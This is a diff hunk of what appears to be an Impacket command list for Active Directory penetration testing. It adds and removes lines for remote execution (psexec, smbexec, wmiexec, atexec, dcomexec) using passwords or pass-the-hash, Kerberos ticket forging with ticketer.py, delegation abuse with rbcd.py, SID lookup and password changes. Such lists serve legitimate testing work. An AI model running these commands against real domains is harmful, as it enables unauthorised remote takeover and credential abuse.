@@ -49,22 +49,20 @@ wmiexec.py -k "$TARGET"
 ticketer.py -nthash "$NT_HASH" -domain-sid S-1-5-11-39129514-1145628974-103568174 -domain "$DOMAIN" randomuser
 ticketer.py -nthash "$NT_HASH" -spn HOST/"$TARGET" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" randomuser
 smbclient.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+smbexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 smbexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 smbexec.py -share 'ADMIN$' -k "$TARGET"
 rpcdump.py "$DC_HOST" | grep -A 6 MS-RPRN
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action remove "$DOMAIN"/"$USER":"$PASSWORD"
 rbcd.py -delegate-from "$USER" -delegate-to 'sv01$' -dc-ip "$DC_IP" -action write "$DOMAIN"/"$USER":"$PASSWORD"
 rbcd.py -delegate-to 'sv01$' -dc-ip "$DC_IP" -action read "$DOMAIN"/"$USER":"$PASSWORD"
-proxychains psexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains secretsdump -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains smbexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains wmiexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains atexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-proxychains dcomexec.py -no-pass "$DOMAIN"/"$USER"@"$TARGET"
-lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST" 0
+lookupsid.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST" 0
+lookupsid.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$DC_HOST" 0
+psexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 psexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+dcomexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
-dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
+atexec.py "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
 atexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 changepasswd.py -newpass '123Pentest!!!' "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
 changepasswd.py -newpass '123Pentest!!!' -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
